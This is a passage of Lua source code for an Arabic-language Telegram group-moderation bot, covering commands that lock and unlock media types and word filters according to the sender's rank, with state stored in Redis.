local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الكلايش  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:spam:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ spam is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الكلايش سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "video" or mutepts[2] == "الفيديو" then
if not hxousedx1:get(HXOUSE..'bot:video:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock video ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الفيديو  \n⌯︙ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:video:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ video is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الفيديو سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "gif" or mutepts[2] == "المتحركه" then
if not hxousedx1:get(HXOUSE..'bot:gifs:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock gif ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  المتحركه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:gifs:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ gif is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل المتحركه سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "music" or mutepts[2] == "الاغاني" then
if not hxousedx1:get(HXOUSE..'bot:music:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock music ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الاغاني  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:music:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ music is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الاغاني سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "voice" or mutepts[2] == "الصوت" then
if not hxousedx1:get(HXOUSE..'bot:voice:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock voice ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الصوت  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 56, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:voice:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ voice is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الصوت سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "links" or mutepts[2] == "الروابط" then
if not hxousedx1:get(HXOUSE..'bot:links:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock links ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الروابط  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:links:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ links is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الروابط سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "location" or mutepts[2] == "المواقع" then
if not hxousedx1:get(HXOUSE..'bot:location:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock location ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  المواقع  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:location:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ location is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل المواقع سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "tag" or mutepts[2] == "المعرف" then
if not hxousedx1:get(HXOUSE..'tags:lock'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock tag ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  المعرف  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 57, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'tags:lock'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ tag is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل المعرف سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "strict" or  mutepts[2] == "الحمايه" then
if not hxousedx1:get(HXOUSE..'bot:strict'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock strict ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الحمايه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:strict'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ strict is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الحمايه سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "file" or mutepts[2] == "الملفات" then
if not hxousedx1:get(HXOUSE..'bot:document:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock file ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الملفات  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:document:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ file is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الملفات سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "hashtag" or mutepts[2] == "الهاشتاك" then
if not hxousedx1:get(HXOUSE..'bot:hashtag:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock hashtag ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الهاشتاك  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:hashtag:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ hashtag is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الهاشتاك سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "contact" or mutepts[2] == "الجهات" then
if not hxousedx1:get(HXOUSE..'bot:contact:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock contact ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الجهات  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 57, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:contact:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ contact is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الجهات سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "webpage" or mutepts[2] == "الشبكات" then
if not hxousedx1:get(HXOUSE..'bot:webpage:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock webpage ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الشبكات  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:webpage:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ webpage is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الشبكات سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "arabic" or mutepts[2] == "العربيه" then
if not hxousedx1:get(HXOUSE..'bot:arabic:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock arabic ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  العربيه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:arabic:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ arabic is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل العربيه سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "english" or mutepts[2] == "الانكليزيه" then
if not hxousedx1:get(HXOUSE..'bot:english:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock english ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الانكليزيه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 61, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:english:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ english is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الانكليزيه سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "sticker" or mutepts[2] == "الملصقات" then
if not hxousedx1:get(HXOUSE..'bot:sticker:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock sticker ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل الملصقات  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:sticker:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ sticker is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الملصقات سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "markdown" or mutepts[2] == "الماركداون" then
if not hxousedx1:get(HXOUSE..'markdown:lock'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock markdown ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الماركداون  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 61, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'markdown:lock'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ markdown is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الماركداون سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "tgservice" or mutepts[2] == "الاشعارات" then
if not hxousedx1:get(HXOUSE..'bot:tgservice:jk'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock tgservice ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الاشعارات  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 60, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:tgservice:jk'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ tgserice is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الاشعارات سابقا ༯', 1, 'md')
end
end
end
if mutept[2] == "fwd" or mutepts[2] == "التوجيه" then
if not hxousedx1:get(HXOUSE..'bot:forward:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock fwd ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  التوجيه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:forward:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ fwd is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل التوجيه سابقا ༯', 1, 'md')
end
end
end
end
end
if text == 'قفل الفشار' and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الفشار  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 57, string.len(msg.sender_user_id_))
hxousedx1:del(HXOUSE.."fshar"..msg.chat_id_)
end
if text == 'فتح الفشار' and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الفشار  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
hxousedx1:set(HXOUSE.."fshar"..msg.chat_id_, true)
end
if text == 'قفل الطائفيه' and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الطائفيه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
hxousedx1:del(HXOUSE.."taf"..msg.chat_id_)
end
if text == 'فتح الطائفيه' and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الطائفيه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 60, string.len(msg.sender_user_id_))
hxousedx1:set(HXOUSE.."taf"..msg.chat_id_, true)
end
if text == 'قفل الكفران' and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الكفران  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
hxousedx1:del(HXOUSE.."kaf"..msg.chat_id_)
end
if text == 'فتح الكفران' and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   الكفران  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
hxousedx1:set(HXOUSE.."kaf"..msg.chat_id_, true)
end
-------------------------------------HXOUSE TEAM----------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Uu]nlock (.*)$") or text:match("^فتح (.*)$") and hxouse11(msg) then
local unmutept = {string.match(text, "^([Uu]nlock) (.*)$")}
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local unmutepts = {string.match(text, "^(فتح) (.*)$")}
if unmutept[2] == "all" or unmutepts[2] == "الكل" or unmutepts[2] == "الكل بالساعات" then
if hxousedx1:get(HXOUSE..'bot:text:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:inline:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:photo:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:spam:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:video:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:gifs:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:music:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:voice:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:links:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:location:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'tags:lock'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:strict'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:document:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:hashtag:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:contact:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:webpage:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:arabic:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:english:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:sticker:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'markdown:lock'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:forward:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'editmsg'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:cmds'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:bots:mute'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:bots:ban'..msg.chat_id_) and hxousedx1:get(HXOUSE..'keed_bots'..msg.chat_id_) and hxousedx1:get(HXOUSE..'anti-flood:'..msg.chat_id_) and hxousedx1:get(HXOUSE..'bot:pin:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been unlock all ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم فتح »   كل الوسائط  \n⌯︙ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 62, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'editmsg'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:cmds'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:bots:mute'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:bots:ban'..msg.chat_id_)
hxousedx1:del(HXOUSE..'keed_bots'..msg.chat_id_)
hxousedx1:del(HXOUSE..'anti-flood:'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:pin:mute'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:text:mute'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:photo:mute'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:spam:mute'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:video:mute'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:document:mute'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:inline:mute'..msg.chat_id_)
hxousedx1:del(HXOUSE..'markdown:lock'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:gifs:mute'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:music:mute'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:voice:mute'..msg.chat_id_)
